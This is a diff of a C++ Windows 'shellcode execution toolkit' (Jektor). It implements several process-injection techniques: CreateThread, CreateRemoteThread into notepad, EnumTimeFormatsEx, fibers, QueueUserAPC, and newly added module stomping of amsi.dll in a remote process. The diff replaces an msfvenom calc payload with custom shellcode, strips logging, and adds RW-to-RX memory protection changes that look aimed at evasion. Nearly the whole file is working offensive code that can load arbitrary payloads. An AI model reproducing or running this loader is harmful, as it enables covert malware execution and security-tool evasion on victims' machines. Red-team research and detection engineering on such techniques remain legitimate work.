@@ -1,76 +1,68 @@
 #include <windows.h>
 #include <stdio.h>
 
-// sudo msfvenom -p windows/x64/exec cmd=calc.exe -b '\x00' -f c
+
 unsigned char shellcodeBuf64[] =
-"\x90\x90\x90"
-"\xeb\x27\x5b\x53\x5f\xb0\x4e\xfc\xae\x75\xfd\x57\x59\x53\x5e"
-"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x94\x3c"
-"\x74\x07\x80\x3e\x4e\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
-"\xff\x07\x4e\xfb\x4f\x84\xe3\xf7\xef\xc7\x07\x07\x07\x46\x56"
-"\x46\x57\x55\x56\x51\x4f\x36\xd5\x62\x4f\x8c\x55\x67\x4f\x8c"
-"\x55\x1f\x4f\x8c\x55\x27\x4f\x8c\x75\x57\x4f\x08\xb0\x4d\x4d"
-"\x4a\x36\xce\x4f\x36\xc7\xab\x3b\x66\x7b\x05\x2b\x27\x46\xc6"
-"\xce\x0a\x46\x06\xc6\xe5\xea\x55\x46\x56\x4f\x8c\x55\x27\x8c"
-"\x45\x3b\x4f\x06\xd7\x8c\x87\x8f\x07\x07\x07\x4f\x82\xc7\x73"
-"\x60\x4f\x06\xd7\x57\x8c\x4f\x1f\x43\x8c\x47\x27\x4e\x06\xd7"
-"\xe4\x51\x4f\xf8\xce\x46\x8c\x33\x8f\x4f\x06\xd1\x4a\x36\xce"
-"\x4f\x36\xc7\xab\x46\xc6\xce\x0a\x46\x06\xc6\x3f\xe7\x72\xf6"
-"\x4b\x04\x4b\x23\x0f\x42\x3e\xd6\x72\xdf\x5f\x43\x8c\x47\x23"
-"\x4e\x06\xd7\x61\x46\x8c\x0b\x4f\x43\x8c\x47\x1b\x4e\x06\xd7"
-"\x46\x8c\x03\x8f\x4f\x06\xd7\x46\x5f\x46\x5f\x59\x5e\x5d\x46"
-"\x5f\x46\x5e\x46\x5d\x4f\x84\xeb\x27\x46\x55\xf8\xe7\x5f\x46"
-"\x5e\x5d\x4f\x8c\x15\xee\x50\xf8\xf8\xf8\x5a\x4f\xbd\x06\x07"
-"\x07\x07\x07\x07\x07\x07\x4f\x8a\x8a\x06\x06\x07\x07\x46\xbd"
-"\x36\x8c\x68\x80\xf8\xd2\xbc\xf7\xb2\xa5\x51\x46\xbd\xa1\x92"
-"\xba\x9a\xf8\xd2\x4f\x84\xc3\x2f\x3b\x01\x7b\x0d\x87\xfc\xe7"
-"\x72\x02\xbc\x40\x14\x75\x68\x6d\x07\x5e\x46\x8e\xdd\xf8\xd2"
-"\x64\x66\x6b\x64\x29\x62\x7f\x62\x07\x94\x3c";
+"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
+"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
+"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
+"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
+"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
+"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
+"\x48\x83\xec\x20\x41\xff\xd6";
+
+wchar_t TARGET_PROCESS_NAME[32] = L"C:\\WINDOWS\\system32\\notepad.exe";
 
 HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+HMODULE hKernelbase = GetModuleHandleW(L"kernelbase.dll");
 
 typedef PVOID(WINAPI* VirtualAllocAddr)(PVOID, SIZE_T, DWORD, DWORD);
 typedef PVOID(WINAPI* CreateThreadAddr)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
 typedef PVOID(WINAPI* CreateProcessWAddr)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef PVOID(WINAPI* OpenProcessAddr)(DWORD, BOOL, DWORD);
-typedef PVOID(WINAPI* WriteProcessMemoryAddr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef PVOID(WINAPI* SleepAddr)(DWORD dwMilliseconds);
+typedef BOOL(WINAPI* VirtualProtectAddr)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
+typedef BOOL(WINAPI* WriteProcessMemoryAddr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef BOOL(WINAPI* ReadProcessMemoryAddr)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
 typedef PVOID(WINAPI* VirtualAllocExAddr)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef PVOID(WINAPI* CreateRemoteThreadAddr)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef BOOL(WINAPI*  EnumProcessModulesAddr)(HANDLE  hProcess,HMODULE* lphModule,DWORD   cb,LPDWORD lpcbNeeded);
+typedef DWORD(WINAPI* GetModuleBaseNameAddr)(HANDLE  hProcess, HMODULE lphModule, LPSTR lpBaseName, DWORD nSize);
+typedef DWORD(WINAPI* GetThreadContextAddr)(HANDLE  hThread, int* context);
+
 
 VirtualAllocAddr pVirtualAlloc = (VirtualAllocAddr)GetProcAddress(hKernel32, "VirtualAlloc");
 CreateThreadAddr pCreateThread = (CreateThreadAddr)GetProcAddress(hKernel32, "CreateThread");
 CreateProcessWAddr pCreateProcessW = (CreateProcessWAddr)GetProcAddress(hKernel32, "CreateProcessW");
 OpenProcessAddr pOpenProcess = (OpenProcessAddr)GetProcAddress(hKernel32, "OpenProcess");
+SleepAddr pSleepAddr = (SleepAddr)GetProcAddress(hKernel32, "Sleep");
 WriteProcessMemoryAddr pWriteProcessMemory = (WriteProcessMemoryAddr)GetProcAddress(hKernel32, "WriteProcessMemory");
+ReadProcessMemoryAddr pReadProcessMemory = (ReadProcessMemoryAddr)GetProcAddress(hKernel32, "ReadProcessMemory");
 VirtualAllocExAddr pVirtualAllocEx = (VirtualAllocExAddr)GetProcAddress(hKernel32, "VirtualAllocEx");
 CreateRemoteThreadAddr pCreateRemoteThread = (CreateRemoteThreadAddr)GetProcAddress(hKernel32, "CreateRemoteThread");
+VirtualProtectAddr pVP = (VirtualProtectAddr)GetProcAddress(hKernel32, "VirtualProtect");
+EnumProcessModulesAddr pEnum = (EnumProcessModulesAddr)GetProcAddress(hKernelbase, "EnumProcessModules");
+GetModuleBaseNameAddr getBaseAddr = (GetModuleBaseNameAddr)GetProcAddress(hKernelbase, "GetModuleBaseNameA");
+GetThreadContextAddr pGetThreadContext = (GetThreadContextAddr)GetProcAddress(hKernelbase, "GetThreadContext");
+
 
 #pragma comment(lib, "ntdll")
 using NtTestAlert = NTSTATUS(NTAPI*)();
 
 void LocalSelfInjection()
 {
-	printf("[>] Local/Self Shellcode Execution Using CreateThread\n\n");
-
-	printf("[+] Resolved the address for VirtualAlloc dynamically - 0x%p\n", pVirtualAlloc);
-	printf("[+] Resolved the address for CreateThread dynamically - 0x%p\n\n", pCreateThread);
-
-	LPVOID shellcodeMem = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	printf("[>] Execute shellcode via Local injection\n\n");
+	LPVOID shellcodeMem = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_READWRITE);
 	if (shellcodeMem != NULL)
 	{
-		printf("[+] Allocated a memory region for the shellcode payload - 0x%p\n", shellcodeMem);
-
 		if (RtlCopyMemory(shellcodeMem, shellcodeBuf64, sizeof(shellcodeBuf64)))
 		{
-			printf("[+] Moved the shellcode payload into the allocated memory region\n");
+			DWORD old_protect = NULL;
+			pVP(shellcodeMem, sizeof(shellcodeBuf64), 0x40, &old_protect);
 
 			DWORD shellcodeThreadId = 1;
 			HANDLE shellcodeExec = pCreateThread(NULL, 0, LPTHREAD_START_ROUTINE(shellcodeMem), 0, 0, &shellcodeThreadId);
 
-			if (shellcodeExec != NULL)
-			{
-				printf("[+] Executed shellcode from a newly created thread - [TID] %u\n", shellcodeThreadId);
-			}
 			WaitForSingleObject(shellcodeExec, 500);
 		}
 	}
@@ -78,44 +70,27 @@ void LocalSelfInjection()
 
 void RemoteShellcodeInjection()
 {
-	printf("[>] Remotely execute shellcode in a hidden notepad process\n\n");
-
-	printf("[+] Resolved the address for CreateProcessW dynamically - 0x%p\n", pCreateProcessW);
-	printf("[+] Resolved the address for OpenProcess dynamically - 0x%p\n", pOpenProcess);
-	printf("[+] Resolved the address for VirtualAllocEx dynamically - 0x%p\n", pVirtualAllocEx);
-	printf("[+] Resolved the address for WriteProcessMemory dynamically - 0x%p\n", pWriteProcessMemory);
-	printf("[+] Resolved the address for CreateRemoteThread dynamically - 0x%p\n\n", pCreateRemoteThread);
-
+	printf("[>] Remotely execute shellcode via CreateRemoteThread injection\n\n");
 	STARTUPINFO startupInfo = { 0 };
 	PROCESS_INFORMATION processInfo = { 0 };
-	PVOID newNotepad = pCreateProcessW(L"C:\\WINDOWS\\system32\\RuntimeBroker.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
+	PVOID newNotepad = pCreateProcessW(TARGET_PROCESS_NAME, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInfo);
+	pSleepAddr(2);
 	if (newNotepad)
 	{
-		printf("[+] Spawned a hidden notepad.exe process - [PID] %i\n", processInfo.dwProcessId);
-
+		pSleepAddr(2);
 		HANDLE openNotepad = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
 		if (openNotepad != NULL)
 		{
-			printf("[+] Opened a handle to the hidden notepad.exe process by PID - 0x%x\n", openNotepad);
-
-			PVOID allocNotepad = pVirtualAllocEx(openNotepad, NULL, sizeof(shellcodeBuf64), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+			PVOID allocNotepad = pVirtualAllocEx(openNotepad, NULL, sizeof(shellcodeBuf64), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
 			if (allocNotepad != NULL)
 			{
-				printf("[+] Remotely allocated a memory region for the shellcode payload\n");
-				printf("[+] Base address of the allocated region - 0x%p\n", allocNotepad);
+				BOOL ret = pWriteProcessMemory(openNotepad, allocNotepad, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
 
-				LPVOID writePayloadNotepad = pWriteProcessMemory(openNotepad, allocNotepad, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
-
-				if (writePayloadNotepad != 0)
+				if (ret != 0)
 				{
-					printf("[+] Wrote the shellcode payload into the remote process\n");
-
 					DWORD lpThreadId = 1;
 					HANDLE execRemotePayload = pCreateRemoteThread(openNotepad, NULL, 0, LPTHREAD_START_ROUTINE(allocNotepad), NULL, 0, &lpThreadId);
-					if (execRemotePayload != NULL)
-					{
-						printf("[+] Executed the payload within a remotely created thread - [TID] %u\n", lpThreadId);
-					}
+					pSleepAddr(2);
 					CloseHandle(processInfo.hProcess);
 					CloseHandle(processInfo.hThread);
 					CloseHandle(openNotepad);
@@ -127,16 +102,12 @@ void RemoteShellcodeInjection()
 
 void EnumTimeFormatsExInjection()
 {
+	printf("[>] Execute shellcode via EnumTimeFormatsEx injection\n\n");
 	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (allocShellcode != NULL)
 	{
-		printf("[+] Allocated a region of memory for the shellcode - 0x%p\n", allocShellcode);
-
 		if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
 		{
-			printf("[+] Copied the shellcode payload into the allocated memory\n");
-
-			printf("[+] Executed shellcode via enumerating time formats\n");
 			EnumTimeFormatsEx(TIMEFMT_ENUMPROCEX(allocShellcode), LOCALE_NAME_USER_DEFAULT, 0, NULL);
 		}
 	}
@@ -144,28 +115,18 @@ void EnumTimeFormatsExInjection()
 
 void CreateFiberInjection()
 {
-	printf("[>] Locally execute shellcode using Windows Fibers\n\n");
-
+	printf("[>] Execute shellcode via CreateFiber injection\n\n");
 	HANDLE currentThread = GetCurrentThread();
 
 	LPVOID convertThreadFiber = ConvertThreadToFiber(NULL);
 	if (convertThreadFiber != NULL) {
-		printf("[+] Converted the main thread to a fiber\n");
-
 		LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (allocShellcode != NULL)
 		{
-			printf("[+] Allcoated a region of memory for the shellcode - 0x%p\n", allocShellcode);
-
 			if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
 			{
-				printf("[+] Copied the shellcode payload into the allocated memory\n");
-
 				LPVOID createNewFiber = CreateFiber(0, LPFIBER_START_ROUTINE(allocShellcode), NULL);
 				if (createNewFiber != NULL) {
-					printf("[+] Created a new fiber including the shellcode payload - 0x%p\n", createNewFiber);
-
-					printf("[+] Executed the shellcode payload using fibers\n");
 					SwitchToFiber(createNewFiber);
 					DeleteFiber(createNewFiber);
 				}
@@ -176,36 +137,22 @@ void CreateFiberInjection()
 
 void QueueUserAPCInjection()
 {
-	printf("[>] Remotely execute shellcode via QueueUserAPC injection\n\n");
-
-	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	printf("[>] Execute shellcode via QueueUserAPC injection\n\n");
+	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READ);
 	if (allocShellcode != NULL)
 	{
-		printf("[+] Allocated a region of RWX memory for the shellcode - 0x%p\n", allocShellcode);
-
 		HANDLE currentProc = GetCurrentProcess();
-		printf("[+] Opened a handle to the current process - 0x%x\n", currentProc);
-
-		PVOID writeShellcode = pWriteProcessMemory(currentProc, allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
-		if (writeShellcode != 0)
+		BOOL ret = pWriteProcessMemory(currentProc, allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
+		if (ret != 0)
 		{
-			printf("[+] Wrote the shellcode payload to the allocated memory region\n");
-
 			HANDLE currentThread = GetCurrentThread();
-			printf("[+] Opened a handle to the current thread - 0x%x\n", currentThread);
 			PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE(allocShellcode));
 
 			DWORD queueApc = QueueUserAPC((PAPCFUNC)apcRoutine, currentThread, NULL);
 			if (queueApc != 0)
 			{
-				printf("[+] Queued a malicious APC routine in the current thread\n");
-
 				NtTestAlert pTestAlert = (NtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
-				printf("[+] Dynamically resolved the address of NtTestAlert from NTDLL - 0x%p\n", pTestAlert);
-				if (pTestAlert())
-				{
-					printf("[+] Detonated the shellcode via NtTestAlert from an APC routine\n");
-				}
+				pTestAlert();
 			}
 			CloseHandle(currentThread);
 			CloseHandle(currentProc);
@@ -213,19 +160,83 @@ void QueueUserAPCInjection()
 	}
 }
 
+void ModuleStompingInjection() {
+	wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
+	STARTUPINFO startupInfo = { 0 };
+	PROCESS_INFORMATION processInfo = { 0 };
+	HMODULE hMods[2048] = {};
+	DWORD modulesSizeNeeded = 0;
+	DWORD moduleNameSize = 0;
+	SIZE_T modulesCount = 0;
+	CHAR remoteModuleName[128] = {};
+	HMODULE remoteModule = NULL;
+	printf("[>] Execute shellcode via ModuleStomping / Module EntryPoint injection\n\n");
+	PVOID newNotepad = pCreateProcessW(TARGET_PROCESS_NAME, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInfo);
+	pSleepAddr(2);
+	if (newNotepad)
+	{
+		pSleepAddr(2);
+		HANDLE openNotepad = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
+
+		if (openNotepad != NULL)
+		{
+			PVOID remoteBuffer = pVirtualAllocEx(openNotepad, NULL, sizeof(moduleToInject), MEM_COMMIT, PAGE_READWRITE);
+			if (remoteBuffer != NULL)
+			{
+				BOOL ret = pWriteProcessMemory(openNotepad, remoteBuffer, moduleToInject, sizeof(moduleToInject), NULL);
+				//pSleepAddr(2);
+				if (ret != 0)
+				{
+					PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+					HANDLE dllThread = CreateRemoteThread(openNotepad, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
+					WaitForSingleObject(dllThread, 1000);
+
+					BOOL res = pEnum(openNotepad, hMods, sizeof(hMods), &modulesSizeNeeded);
+					modulesCount = modulesSizeNeeded / sizeof(HMODULE);
+					for (size_t i = 0; i < modulesCount; i++)
+					{
+						remoteModule = hMods[i];
+						getBaseAddr(openNotepad, remoteModule, remoteModuleName, sizeof(remoteModuleName));
+						if (_strcmpi(remoteModuleName, "amsi.dll") == 0)
+						{
+							break;
+						}
+					}
+					DWORD headerBufferSize = 0x1000;
+					LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
+					ret = pReadProcessMemory(openNotepad, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);
+					if (ret != 0) {
+						PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
+						PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
+						LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
+						ret = pWriteProcessMemory(openNotepad, dllEntryPoint, (LPCVOID)shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
+						if (ret != 0) {
+							HANDLE execRemotePayload = pCreateRemoteThread(openNotepad, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
+							pSleepAddr(2);
+							CloseHandle(processInfo.hProcess);
+							CloseHandle(processInfo.hThread);
+							CloseHandle(openNotepad);
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+
+
 int main(int argc, char* argv[])
 {
 	if (argc == 1)
 	{
 		fprintf(stdout,
-			"\nJektor - Shellcode Execution Toolkit\n\n"
-			"\tUsage    Injection type description\n"
-			"\t-----    -----------------------------------------------------------------\n"
-			"\t/LIJ     Execute shellcode in a local thread (CreateThread)\n"
-			"\t/RIJ     Execute shellcode in a remote hidden process (CreateRemoteThread)\n"
-			"\t/TIJ     Execute shellcode via EnumTimeFormatsEx\n"
-			"\t/FIJ     Execute shellcode via Fibers (CreateFiber)\n"
-			"\t/QIJ     Execute shellcode remotely via APC routines (QueueUserAPC) \n");
+			"\t/LIJ     Local Thread Injection\n"
+			"\t/RIJ     RemoteThread Injection\n"
+			"\t/TIJ     EnumTimeFormatsEx Injection\n"
+			"\t/FIJ     Fiber Injection\n"
+			"\t/QIJ     APC Injection \n"
+			"\t/MSIJ    Module Stomping Injection \n");
 	}
 	if (strcmp(argv[1], "/LIJ") == 0)
 	{
@@ -243,9 +254,9 @@ int main(int argc, char* argv[])
 	{
 		CreateFiberInjection();
 	}
-	if (strcmp(argv[1], "/QIJ") == 0)
+	if (strcmp(argv[1], "/MSIJ") == 0)
 	{
-		QueueUserAPCInjection();
+		ModuleStompingInjection();
 	}
 	return 0;
 }
